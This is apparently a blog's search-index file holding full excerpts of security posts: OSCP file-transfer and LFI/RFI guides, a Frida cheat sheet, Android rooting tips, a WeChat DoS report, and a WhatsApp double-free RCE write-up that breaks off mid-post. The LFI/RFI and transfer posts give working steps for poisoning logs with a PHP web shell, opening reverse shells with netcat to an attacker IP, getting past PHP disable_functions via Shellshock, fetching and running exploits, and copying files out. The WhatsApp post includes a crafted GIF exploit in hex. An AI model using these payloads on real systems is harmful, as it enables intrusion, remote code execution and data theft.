var store = [{
        "title": "Transfer files from Kali to the target machine",
        "excerpt":"Tranfer files to the target machine is particularly useful when we have already had a reverse shell on Windows. Windows does not have convenient commands to download files such as wget in Linux. If PHP RFI is available We first encode the file using this online tool https://www.base64encode.org/, and then use PHP base64_decode to decode and write the content into the wanted location: &lt;?php$encoded = 'PUT_BASE64_ENCODED_FILE_HERE';$file = '/tmp/findsock';$fp = fopen($file, 'wb');fwrite($fp, base64_decode($encoded));fclose($fp);system(\"chmod 0777 \" . $file);echo system(\"ls -la /tmp\");?&gt;To Linux machine Use wget cd /tmp &amp;&amp; wget -O exploit.php 10.11.0.105/exploit.php &amp;&amp; php -f exploit.phpSSH To put files to the attacking machine ssh root@10.11.0.105 \"cat &gt; proof.txt\" &lt; proof.txtTo get files from the attacking machine ssh root@10.11.0.105 \"cat exploit\" &gt; exploitTo Windows machine HTTP Server python -m SimpleHTTPServer 80FTP Server To start Python FTP server: apt-get install python-pyftpdlib  python -m pyftpdlib -p 21 -wTo put/get files: echo open 10.11.0.105&gt;ftp.txtecho anonymous&gt;&gt;ftp.txtecho password&gt;&gt;ftp.txtecho binary&gt;&gt;ftp.txtecho get shell.exe&gt;&gt;ftp.txt echo bye&gt;&gt;ftp.txtftp -s:ftp.txtTFTP Server To start Kali TFTP server: service atftpd startTo get files (put does not work): tftp -i 10.11.1.5 GET met8888.exetftp -i 10.11.0.105 PUT C:\\bank-account.zip // Not workingIf tftp is not available: pkgmgr /iu:\"TFTP\"  SMB Server To start SMB server: python /opt/impacket/examples/smbserver.py ROPNOP /root/To put/get files: copy \\\\10.11.0.105\\ROPNOP\\nc.exe .copy C:\\bank-account.zip \\\\10.11.0.105\\ROPNOP\\References   https://blog.ropnop.com/transferring-files-from-kali-to-windows/  http://ostrokonskiy.tk/2017/01/23/windows-privilege-escalation/","categories": ["OSCP"],
        "tags": [],
        "url": "https://awakened1712.github.io/oscp/oscp-transfer-files/",
        "teaser":"https://awakened1712.github.io/assets/img/oscp-teaser.jpg"},{
        "title": "LFI and RFI",
        "excerpt":"LFI happens when an PHP page explicitly calls include function to embed another PHP page, which can be controlled by the attacker.For example, addguestbook.php below include another PHP page that can be chosen depending on the language input: $lang = $_GET['LANG'];include( $lang . '.php' );Because the LANG field can be controlled, the attacker can put in the path to a local or remote file. 1. Local file inclusion (LFI) a. Reading arbitrary files Windows hosts file:http://10.11.23.188/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00 b. Contaminating apache log file and executing it Use netcat to connect to the server and contaminate C:/xampp/apache/logs/access.log file: root@kali:~# nc -v 10.11.23.188 8010.11.23.188: inverse host lookup failed: Unknown host(UNKNOWN) [10.11.23.188] 80 (http) open &lt;?php echo shell_exec($_GET['cmd']);?&gt; ^CAfter contamination, the access.log file on the serve is like this:   10.11.0.105 - - [11/Mar/2018:11:24:17 -0400] “GET /addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&amp;cmd=ipconfig HTTP/1.1” 200 36910.11.0.105 - - [11/Mar/2018:11:24:48 -0400] “ “ 400 366 Display the access.log file to execute the command:http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&amp;cmd=ipconfig c. Transferring netcat and obtaining reverse shell Kali: mkdir /tftp atftpd --daemon --port 69 /tftp cp /usr/share/windows-binaries/nc.exe /tftp/ Windows: tftp -i 10.11.0.105 get nc.exenc.exe -e cmd.exe 10.11.0.105 4444Kali: nc -lvp 4444Access this URL to open the shellhttp://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&amp;cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444Note: python -c 'import pty; pty.spawn(\"/bin/sh\")'is used to get the TTY shell 2. Remote file inclusion (RFI) Executing a command via a remote php page:http://10.11.23.188/addguestbook.php?LANG=http://10.11.0.105:31/evil.txt%00 Content of /var/www/html/evil.txt: &lt;?php echo shell_exec(\"nc.exe 10.11.0.105 4444 -e cmd.exe\") ?&gt;Most modern php configuration disallows remote file includes of http URIs. For example: xampp/apache/bin/php.ini allow_url_fopen = Offallow_url_include = Off3. Bypass PHP disable_functions The server admin can disable PHP command execution to enhance the security. In that case, we have to bypass it so that our LFI/RFI attack is meaningful. a. Use PHP code to download file and list directory function listDir($dir) {    if ($handle = opendir($dir)) {        while (false !== ($entry = readdir($handle))) {            if ($entry != \".\" &amp;&amp; $entry != \"..\")                echo \"$entry&lt;br&gt;\";        }        closedir($handle);    }}function downloadFile($url, $path) {    unlink($path);    $file = fopen ($url, 'rb');    if ($file) {        $newf = fopen ($path, 'wb');        if ($newf) {            while(!feof($file))                fwrite($newf, fread($file, 1024 * 8), 1024 * 8);            fclose($file);        }        fclose($file);    }}b. PHP 4.2.0+, PHP 5: pcntl_exec &lt;?php$cmd = @$_REQUEST[cmd];if(function_exists('pcntl_exec'))    die('pcntl not found');$cmd = $cmd.\"&amp;pkill -9 bash &gt;out\";pcntl_exec(\"/bin/bash\", $cmd);echo file_get_contents(\"out\");        ?&gt;c. PHP 5.2.3: Win32std ext Protections Bypass &lt;?phpif (!extension_loaded(\"win32std\")) die(\"win32std extension required!\");system(\"cmd.exe\"); //just to be sure that protections work wellwin_shell_execute(\"..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe\");?&gt;d. PHP 5.x: Shellshock &lt;?phpfunction shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283    if(strstr(readlink(\"/bin/sh\"), \"bash\") != FALSE) {        $tmp = tempnam(\".\",\"data\");        putenv(\"PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1\");        mail(\"a@127.0.0.1\",\"\",\"\",\"\",\"-bv\"); // -bv so we don't actually send any mail    }    else return \"Not vuln (not bash)\";    $output = @file_get_contents($tmp);    @unlink($tmp);    if($output != \"\") return $output;    else return \"No output, or not vuln.\";}?&gt;4. Deal with missing -e option in netcat Certain nc version does not provide -e option for us to open a shell session. Workaround by using /bin/sh as below: &lt;?phpfunction reverse_shell() {    echo \"Disabled functions: \" . ini_get('disable_functions').\"\\n\";    unlink(\"/tmp/backpipe\");    echo shellshock(\"mknod /tmp/backpipe p \");    echo shellshock(\"/bin/sh -c '/bin/sh 0&lt;/tmp/backpipe | nc 10.11.0.105 4444 1&gt;/tmp/backpipe'\");}?&gt;References: LFI:   http://resources.infosecinstitute.com/local-file-inclusion-code-execution/  https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/  https://www.sunnyhoi.com/how-to-hack-a-website-using-local-file-inclusion-lfi/TTY:   http://pentestmonkey.net/blog/post-exploitation-without-a-tty  https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/Reverse shell:   https://highon.coffee/blog/reverse-shell-cheat-sheet/  https://netsec.ws/?p=331PHP disable_functions   http://blog.safebuff.com/2016/05/06/disable-functions-bypass/Netcat missing -e   https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/","categories": ["OSCP"],
        "tags": [],
        "url": "https://awakened1712.github.io/oscp/oscp-lfi-rfi/",
        "teaser":"https://awakened1712.github.io/assets/img/oscp-teaser.jpg"},{
        "title": "Frida cheat sheet",
        "excerpt":"Frida is particularly useful for dynamic analysis on Android/iOS/Windows applications. It allows us to set up hooks on the target functions so that we can inspect/modify the parameters and return value. We can also alter the entire logic of the hooked function. This article shows the most useful code snippets for copy&amp;paste to save time reading the lengthy documentation page. Frida python binding Python binding to attach to an app: import frida, sys ss = \"\"\"Java.perform(function () {    // declare classes that are going to be used    const System = Java.use('java.lang.System');    const Log = Java.use(\"android.util.Log\");    const Exception = Java.use(\"java.lang.Exception\");        System.exit.implementation = function() {        // console.log(Log.getStackTraceString(Exception.$new()));    };});\"\"\"device = frida.get_device_manager().enumerate_devices()[-1]session = device.attach(\"com.example.test\")script = session.create_script(ss)script.load()sys.stdin.read()Python binding to spawn an app: import frida, sys ss = \"\"\"Java.perform(function () {    // declare classes that are going to be used    const System = Java.use('java.lang.System');    const Log = Java.use(\"android.util.Log\");    const Exception = Java.use(\"java.lang.Exception\");        System.exit.implementation = function() {        // console.log(Log.getStackTraceString(Exception.$new()));    };});\"\"\"device = frida.get_usb_device()pid = device.spawn([\"com.example.test\"])session = device.attach(pid)script = session.create_script(ss)script.load()device.resume(pid)sys.stdin.read()Note that we need to load the script first before resuming if we need to perform early interception. frida-trace Attach to Chrome app on an Android phone and trace two native functions open and strcmp $ frida-trace -U -i open -i strcmp -f com.android.chromeLaunch SnapChat app on an iPhone and trace CommonCrypto API calls $ frida-trace -U -I \"libcommonCrypto*\" -f com.toyopagroup.picabooTrace an Obj-C method of Safari app $ frida-trace -U -m \"-[NSView drawRect:]\" SafariFrida over network On the target device (192.168.1.3) $ frida-server -l 0.0.0.0On the attacking machine frida-trace -H 192.168.1.3 -i \"open*\"Common scripts Convert IDA address to memory address and vice versa function memAddress(memBase, idaBase, idaAddr) {    var offset = ptr(idaAddr).sub(idaBase);    var result = ptr(memBase).add(offset);    return result;}function idaAddress(memBase, idaBase, memAddr) {    var offset = ptr(memAddr).sub(memBase);    var result = ptr(idaBase).add(offset);    return result;}C: Hook HMAC function and print out the params Interceptor.attach(Module.findExportByName(\"liba.so\", \"HMAC\"), {    onEnter: function (args) {        var keySize = args[2].toInt32();        var keyDump = Memory.readByteArray(args[1], keySize);        console.log('HMAC Key found at ' + args[1]);        console.log('HMAC Key size = ' + keySize);        console.log(hexdump(keyDump, { offset: 0, length: keySize, header: false, ansi: false }));      }});C: Hook a static function by resolving its address const membase = Module.findBaseAddress('libtest.so');const fstatat = memAddress(membase, '0x0', '0x69E238');Interceptor.attach(fstatat, {    onEnter: function (args) {        console.log('[+] fstatat: ' + Memory.readUtf8String(args[1]));        Memory.writeUtf8String(args[1], \"/empty\");    }});C: Print the backtraces of a list of functions const membase = Module.findBaseAddress('libtest.so');const funcs = [ '0x21B248', '0x21D0C8', '0x234730', '0x23F718', '0x259E68' ];for (var i in funcs) {    var funcPtr = memAddress(membase, '0x0', funcs[i]);    var handler = (function() {        var name = funcs[i];        return function(args) {            console.log(name + ': ');            var trace = Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress);            for (var j in trace)                console.log(trace[j]);        };    })();    Interceptor.attach(funcPtr, {onEnter: handler});}C: Print the execution traces of a list of functions with Stalker const funcs = [ '0x870FF0', '0x871BA0' ];const STALKED = 12345;const STARTING_ADDRESS = \"0x102FE0\";const ENDING_ADDRESS = \"0x89BE04\";const base = Module.findBaseAddress('libtest.so');var threads = [];for (var i in funcs) {    console.log('Hooking funcs[' + i + '] ' + funcs[i]);    Interceptor.attach(memAddress(base, '0x0', funcs[i]), {        onEnter: function (args) {            var tid = Process.getCurrentThreadId();            if (threads[tid] == STALKED)                return;            Stalker.follow(tid, {                events: {                    call: true, // CALL instructions: yes please                    ret: false, // RET instructions: no thanks                    exec: false // all instructions: no thanks                },                onCallSummary: function (summary) {                    var log = []                    for (i in summary) {                        var addr = idaAddress(base, '0x0', i);                        if (addr.compare(ptr(STARTING_ADDRESS)) &gt;= 0 &amp;&amp; addr.compare(ptr(ENDING_ADDRESS)) &lt;= 0)                            log.push(addr);                    }                    console.log(JSON.stringify(log));                }            });            threads[tid] = STALKED;        },        onLeave: function (retval) {            var tid = Process.getCurrentThreadId();            if (threads[tid] == STALKED)                return;            Stalker.unfollow(tid);            Stalker.garbageCollect();        }    });}C: Invoke a libc function var openPtr = Module.findExportByName(\"libc.so\", \"open\");var open = new NativeFunction(openPtr, 'int', ['pointer', 'int']);var fd = open(Memory.allocUtf8String('/tmp/test.txt'), 0);Android: Hook C remove() function to save a files that is going to be deleted const File = Java.use(\"java.io.File\");const FileInputStream = Java.use(\"java.io.FileInputStream\");const FileOutputStream = Java.use(\"java.io.FileOutputStream\");const ActivityThread = Java.use(\"android.app.ActivityThread\");var name = 0;Interceptor.attach(Module.findExportByName(null, \"remove\"), {    onEnter: function (args) {        path = Memory.readUtf8String(args[0]);        Java.perform(function () {            // create the input channel            var f = File.$new(path);            var fis = FileInputStream.$new(f);            var inChannel = fis.getChannel();            // create the output channet            var application = ActivityThread.currentApplication();            if (application == null)                return;            var context = application.getApplicationContext();            var fos = context.openFileOutput('deleted_' + name, 0);            name = name + 1;            var outChannel = fos.getChannel();            // transfer the file from the input channel to the output channel            inChannel.transferTo(0, inChannel.size(), outChannel);            fis.close();            fos.close();        });    }});iOS: Hook an Obj-C method const sendMessage = ObjC.classes.SecureStorage[\"- readFile:\"];Interceptor.attach(sendMessage.implementation, {    onLeave: function (retval) {        var message = ObjC.Object(retval);        console.log(\"- [SecureStorage readFile:] --&gt;\\n\\\"\" + message.toString() + \"\\\"\");    }});Android: Hook constructor method of SecretKeySpec to print out the key byte array Java.perform(function () {    var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(p0, p1) {        console.log('SecretKeySpec.$init(\"' + bytes2hex(p0) + '\", \"' + p1 + '\")');        return this.$init(p0, p1);    };});function bytes2hex(array) {    var result = '';    console.log('len = ' + array.length);    for(var i = 0; i &lt; array.length; ++i)        result += ('0' + (array[i] &amp; 0xFF).toString(16)).slice(-2);    return result;}Android: Hook the library loading Java.perform(function() {    const System = Java.use('java.lang.System');    const Runtime = Java.use('java.lang.Runtime');    const VMStack = Java.use('dalvik.system.VMStack');    System.loadLibrary.implementation = function(library) {        try {            console.log('System.loadLibrary(\"' + library + '\")');            const loaded = Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), library);            return loaded;        } catch(ex) {            console.log(ex);        }    };        System.load.implementation = function(library) {        try {            console.log('System.load(\"' + library + '\")');            const loaded = Runtime.getRuntime().load0(VMStack.getCallingClassLoader(), library);            return loaded;        } catch(ex) {            console.log(ex);        }    };});Android: create Java byte array var buffer = Java.array('byte', [ 13, 37, 42 ]);Android: Java bytearray dumping function bytes2hex(array) {    var result = '';    for(var i = 0; i &lt; array.length; ++i)        result += ('0' + (array[i] &amp; 0xFF).toString(16)).slice(-2);    result += ' (' + array.length + ' bytes)'    return result;}function jhexdump(array) {    var ptr = Memory.alloc(array.length);    for(var i = 0; i &lt; array.length; ++i)        Memory.writeS8(ptr.add(i), array[i]);    console.log(hexdump(ptr, { offset: 0, length: array.length, header: false, ansi: false }));}Android: Java inspect a Java class of an Java object const Class = Java.use(\"java.lang.Class\");function inspectObject(obj) {    const obj_class = Java.cast(obj.getClass(), Class);    const fields = obj_class.getDeclaredFields();    const methods = obj_class.getMethods();    console.log(\"Inspecting \" + obj.getClass().toString());    console.log(\"\\tFields:\");    for (var i in fields)        console.log(\"\\t\\t\" + fields[i].toString());    console.log(\"\\tMethods:\");    for (var i in methods)        console.log(\"\\t\\t\" + methods[i].toString());}","categories": ["Hacking"],
        "tags": [],
        "url": "https://awakened1712.github.io/hacking/hacking-frida/",
        "teaser":"https://awakened1712.github.io/assets/img/frida.png"},{
        "title": "Useful Magisk modules",
        "excerpt":"MagiskHide Props Config Even on a rooted Android phones, you won’t be able to debug your apps if they are built as non-debuggable. In order to work around that, you need to somehow change the ro.debuggable attribute to 1. However, if you do that, an app can read /default.prop to detect that and stop operating. The solution is to use Magisk and its module called MagiskHide Props Config. More info on MagiskHide Props Config can be found at https://forum.xda-developers.com/apps/magisk/module-magiskhide-props-config-simple-t3765199 Usage Install through the Magisk Manager Downloads section.After installing and rebooting: supropsThen, choose MagiskHide props to change ro.debuggable to 1 Magisk SELinux manager Some tools and apps (e.g. frida, EDS, Viper Acoustic, …) do not work if SELinux is en enforcing mode. Magisk SELinux manager allows changing SELinux mode while being undetected by SafetyNet. Systemless Xposed Framework This allows SafetyNet-undetectable installation of Xposed Framework. ","categories": ["Hacking"],
        "tags": [],
        "url": "https://awakened1712.github.io/hacking/hacking-magisk-modules/",
        "teaser":"https://awakened1712.github.io/assets/img/magisk.png"},{
        "title": "Handy Android code snippets",
        "excerpt":"This blog post is a memo of handy Android code snippets that I found particularly useful in programming and hacking. Execute a shell command as root Reference: https://blog.csdn.net/black_bird_cn/article/details/79717245 public static String execRootCmd(String cmd) {    String result = \"\";    DataOutputStream dos = null;    DataInputStream dis = null;    try {        Process p = Runtime.getRuntime().exec(\"su\");        dos = new DataOutputStream(p.getOutputStream());        dis = new DataInputStream(p.getInputStream());        dos.writeBytes(cmd + \"\\n\");        dos.flush();        dos.writeBytes(\"exit\\n\");        dos.flush();        String line = null;        while ((line = dis.readLine()) != null) {            result += line;        }        p.waitFor();    }    catch (Exception e) {    }    finally {        if (dos != null) {            try { dos.close(); }            catch (IOException e) { }        }        if (dis != null) {            try { dis.close(); }            catch (IOException e) {         }    }    return result;}","categories": ["Programming"],
        "tags": [],
        "url": "https://awakened1712.github.io/programming/programming-handy-android-code-snippets/",
        "teaser":"https://awakened1712.github.io/assets/img/android.png"},{
        "title": "Install a trusted CA in Android N",
        "excerpt":"It’s very trivial to install a user-trusted certificate on Android. Under Settings -&gt; Security you can install new trusted certificates. However, this creates a permanent “Your network could be monitored” warning in your task tray and forces you to have a lock-screen. In addition to this, apps that target API Level 24 and above no longer trust user or admin-added CAs for secure connections, by default. This guide shows how to install a system-trusted CA certificate. Most of the steps are referenced from Using a custom root CA with Burp for inspecting Android N traffic, excep that this guide is adapted to generate only 730-day certificates to deal with error NET::ERR_CERT_VALIDITY_TOO_LONG in Chrome Generate openssl req -x509 -days 730 -nodes -newkey rsa:2048 -outform der -keyout server.key -out ca.der -extensions v3_caConvert the private key openssl rsa -in server.key -inform pem -out server.key.der -outform deropenssl pkcs8 -topk8 -in server.key.der -inform der -out server.key.pkcs8.der -outform der -nocryptConvert the public key openssl x509 -inform der -in ca.der -out ca.pemopenssl x509 -inform PEM -subject_hash_old -in ca.pem | head -1cp ca.pem a58355c2.0openssl x509 -inform PEM -text -in ca.pem -out /dev/null&gt;&gt; a58355c2.0Copy the cert to the phone adb push a58355c2.0 /data/local/tmpadb shellIn the adb shell sumount -o rw,remount /systemmv /data/local/tmp/a58355c2.0 /system/etc/security/cacerts/chown root:root /system/etc/security/cacerts/a58355c2.0chmod 644 /system/etc/security/cacerts/a58355c2.0rebootImport the cert into BurpSuite Go to the proxy settings page and choose “Import / Export CA Certificate” -&gt; “Import” -&gt; “Certificate and priate key in DER format”  ","categories": ["Hacking"],
        "tags": [],
        "url": "https://awakened1712.github.io/hacking/hacking-install-ca-android/",
        "teaser":"https://awakened1712.github.io/assets/img/android.png"},{
        "title": "RB App Checker",
        "excerpt":"This tiny yet powerful app lets us check the iOS application for the certificates, requirements and entitlements, embedded provisioning profiles, auxiliary executables and frameworks, cross-check all this information for consistency, and check that the application’s resources have not been altered after signing.  Install at https://itunes.apple.com/vn/app/rb-app-checker-lite/id519421117?mt=12 ","categories": ["Programming"],
        "tags": [],
        "url": "https://awakened1712.github.io/programming/programming-iOS-app-info/",
        "teaser":"https://awakened1712.github.io/assets/img/RB%20App%20Checker.png"},{
        "title": "DoS Wechat with an emoji",
        "excerpt":"This DoS bug was reported to Tencent, but they decided not to fix because it’s not critical. The Common Vulnerabilities and Exposures (CVE) Program has assigned the ID CVE-2019-11419 to this issue. Description: vcodec2_hls_filter in libvoipCodec_v7a.so in WeChat application for Android results in a DoS by replacing an emoji file (under the /sdcard/tencent/MicroMsg directory) with a crafted .wxgf file.Crash-log is provided in poc.zip file at https://drive.google.com/open?id=1HFQtbD10awuUicdWoq3dKVKfv0wvxOKS Vulnerability Type: Denial of Service Vendor of Product: Tencent Affected Product Code Base: WeChat for Android - Up to latest version (7.0.3) Affected Component: Function vcodec2_hls_filter in libvoipCodec_v7a.so Attack Type: Local Attack vector: An malware app can crafts a malicious emoji file and overwrites the emoji files under /sdcard/tencent/MicroMsg/[User_ID]/emoji/[WXGF_ID]. Once the user opens any chat messages that contain an emoji, WeChat will instantly crash. POC: Video at https://drive.google.com/open?id=1x1Z3hm4j8f4rhv_WUp4gW-bhdtZMezdU   User must have sent or received a GIF file in WeChat  Malware app must retrieve the phone’s IMEI. For POC, we can use the below command    adb shell service call iphonesubinfo 1 | awk -F \"'\" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print}' ORS=-         Produce the malicious emoji file with the retrieved IMEI (use encrypt_wxgf.py in poc.zip):    python encrypt.py crash4.wxgf [SIZE_OF_EMOJI_ON_SDCARD]        Replace /sdcard/tencent/MicroMsg/[User_ID]/emoji/[WXGF_ID] with the padded out.wxgf.encrypted  WeChat will crash now if a message that contains the overwritten emoji fileCrash log: Process:            com.tencent.mmCrash Thread:       27374(total:122)Date/Time:          2108-12-12 +8.00 13:34:50.135Live Time:          35sDevice:             Pixel 2 XL android-27Exception info:    Siginfo:            errno:0, pid:0, uid:0, process:after unwind signal thread*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***Build fingerprint: google/taimen/taimen:8.1.0/OPM4.171019.021.R1/4833808:user/release-keyspid: 27147, tid: 27374  &gt;&gt;&gt; com.tencent.mm &lt;&lt;&lt;signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000after dump thread backtrace  #00  pc 0x0  &lt;unknown&gt; (???)  #01  pc 0x1f739b  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (vcodec2_hls_filter+546)  #02  pc 0x1f8efb  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (vcodec2_hls_filters+134)  #03  pc 0x1efa5d  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (???)  #04  pc 0x1ea94f  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (v2codec_default_execute+30)  #05  pc 0x1f1c59  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (???)  #06  pc 0x1eaa49  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (v2codec_decode_video2+120)  #07  pc 0x1e375d  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (Vcodec2DecodeMultipleNals+176)  #08  pc 0x1e510f  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (CWxAMDecoder::decodeColorComponents(unsigned char*, int)+70)  #09  pc 0x1e5791  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (CWxAMDecoder::add_buffer(unsigned char*, int, int, StWxAMFrame**)+228)  #10  pc 0x1e5995  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (wxam_dec_decode_buffer_3+12)  #11  pc 0x4c435  /data/app/com.tencent.mm-XUPZwNZyUC6RN4utDMIYMw==/lib/arm/libwechatcommon.so (Java_com_tencent_mm_plugin_gif_MMWXGFJNI_nativeDecodeBufferFrame+148)  ...","categories": ["Hacking"],
        "tags": [],
        "url": "https://awakened1712.github.io/hacking/hacking-wechat-dos/",
        "teaser":null},{
        "title": "How a double-free bug in WhatsApp turns to RCE",
        "excerpt":"In this blog post, I’m going to share about a double-free vulnerability that I discovered in WhatsApp for Android, and how I turned it into an RCE. I informed this to Facebook. Facebook acknowledged and patched it officially in WhatsApp version 2.19.244. Facebook helped to reserve CVE-2019-11932 for this issue. WhatsApp users, please do update to latest WhatsApp version (2.19.244 or above) to stay safe from this bug. Demo https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view Google Drive link to download if the above link is not accessible https://drive.google.com/open?id=1X9nBlf5oj5ef2UoYGOfusjxAiow8nKEK The steps are as below:   0:16 Attacker sends GIF file to user via any channels          One of them could be as Document via WhatsApp (i.e. pressing the Paper Clip button and choose Document to send the corrupted GIF)      If the attacker is in the contact list of the user (i.e. a friend), the corrupted GIF is downloaded automatically without any user interaction.        0:24 User wants to send a media file to any of his/her WhatsApp friend. So the user presses on the Paper clip button and opens the WhatsApp Gallery to choose a media file to send to his friend.          Take note that the user does not have to send anything because just opening the WhatsApp Gallery will trigger the bug. No additional touch after pressing WhatsApp Gallery is necessary.        0:30 Since WhatsApp shows previews of every media (including the GIF file received), it will trigger the double-free bug and our RCE exploit.Double-free vulnerability in DDGifSlurp in decoding.c in libpl_droidsonroids_gif When a WhatsApp user opens Gallery view in WhatsApp to send a media file, WhatsApp parses it with a native library called libpl_droidsonroids_gif.so to generate the preview of the GIF file. libpl_droidsonroids_gif.so is an open-source library with source codes available at https://github.com/koral–/android-gif-drawable/tree/dev/android-gif-drawable/src/main/c. A GIF file contains multiple encoded frames. To store the decoded frames, a buffer with name rasterBits is used. If all frames have the same size, rasterBits is re-used to store the decoded frames without re-allocation. However, rasterBits would be re-allocated if one of three conditions below is met:   width * height &gt; originalWidth * originalHeight  width - originalWidth &gt; 0  height - originalHeight &gt; 0Re-allocation is a combination of free and malloc. If the size of the re-allocation is 0, it is simply a free. Let say we have a GIF file that contains 3 frames that have sizes of 100, 0 and 0.   After the first re-allocation, we have info-&gt;rasterBits buffer of size 100.  In the second re-allocation of 0, info-&gt;rasterBits buffer is freed.  In the third re-allocation of 0, info-&gt;rasterBits is freed again.This results in a double-free vulnerability. The triggering location can be found in decoding.c: int_fast32_t widthOverflow = gifFilePtr-&gt;Image.Width - info-&gt;originalWidth;int_fast32_t heightOverflow = gifFilePtr-&gt;Image.Height - info-&gt;originalHeight;const uint_fast32_t newRasterSize =        gifFilePtr-&gt;Image.Width * gifFilePtr-&gt;Image.Height;if (newRasterSize &gt; info-&gt;rasterSize || widthOverflow &gt; 0 ||    heightOverflow &gt; 0) {    void *tmpRasterBits = reallocarray(info-&gt;rasterBits, newRasterSize,     &lt;&lt;-- double-free here                                       sizeof(GifPixelType));    if (tmpRasterBits == NULL) {        gifFilePtr-&gt;Error = D_GIF_ERR_NOT_ENOUGH_MEM;        break;    }    info-&gt;rasterBits = tmpRasterBits;    info-&gt;rasterSize = newRasterSize;}In Android, a double-free of a memory with size N leads to two subsequent memory-allocation of size N returning the same address. (lldb) expr int $foo = (int) malloc(112)(lldb) p/x $foo(int) $14 = 0xd379b250 (lldb) p (int)free($foo)(int) $15 = 0 (lldb) p (int)free($foo)(int) $16 = 0 (lldb) p/x (int)malloc(12)(int) $17 = 0xd200c350 (lldb) p/x (int)malloc(96)(int) $18 = 0xe272afc0 (lldb) p/x (int)malloc(180)(int) $19 = 0xd37c30c0 (lldb) p/x (int)malloc(112)(int) $20 = 0xd379b250 (lldb) p/x (int)malloc(112)(int) $21 = 0xd379b250In the above snippet, variable $foo was freed twice. As a result, the next two allocations ($20 and $21) return the same address. Now look at struct GifInfo in gif.h struct GifInfo {    void (*destructor)(GifInfo *, JNIEnv *);  &lt;&lt;-- there's a function pointer here    GifFileType *gifFilePtr;    GifWord originalWidth, originalHeight;    uint_fast16_t sampleSize;    long long lastFrameRemainder;    long long nextStartTime;    uint_fast32_t currentIndex;    GraphicsControlBlock *controlBlock;    argb *backupPtr;    long long startPos;    unsigned char *rasterBits;    uint_fast32_t rasterSize;    char *comment;    uint_fast16_t loopCount;    uint_fast16_t currentLoop;    RewindFunc rewindFunction;   &lt;&lt;-- there's another function pointer here    jfloat speedFactor;    uint32_t stride;    jlong sourceLength;    bool isOpaque;    void *frameBufferDescriptor;};We then craft a GIF file with three frames of below sizes:   sizeof(GifInfo)  0  0When the WhatsApp Gallery is opened, the said GIF file triggers the double-free bug on rasterBits buffer with size sizeof(GifInfo). Interestingly, in WhatsApp Gallery, a GIF file is parsed twice. When the said GIF file is parsed again, another GifInfo object is created. Because of the double-free behavior in Android, GifInfo info object and info-&gt;rasterBits will point to the same address. DDGifSlurp() will then decode the first frame to info-&gt;rasterBits buffer, thus overwriting info and its rewindFunction(), which is called right at the end of DDGifSlurp() function. Controlling PC register The GIF file that we need to craft is as below: 47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00 00 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 08 9C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 CE 57 2B 6F EE FF FF 2C 00 00 00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00 18 00 0A 00 0F 00 01 00 00 3BIt contains four frames:   Frame 1:    2C 00 00 00 00 08 00 15 00 00 08 9C 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00F0 CE 57 2B 6F EE FF FF        Frame 2:    2C 00 00 00 00 1C 0F 00 00 00 00        Frame 3:    2C 00 00 00 00 1C 0F 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00        Frame 4:    2C 00 00 00 00 18 00 0A 00 0F 00 01 00 00        The below sequence is what happened when WhatsApp Gallery is opened:     First parse:          Init:                  GifInfo *info = malloc(168);                    Frame 1:                  info-&gt;rasterBits 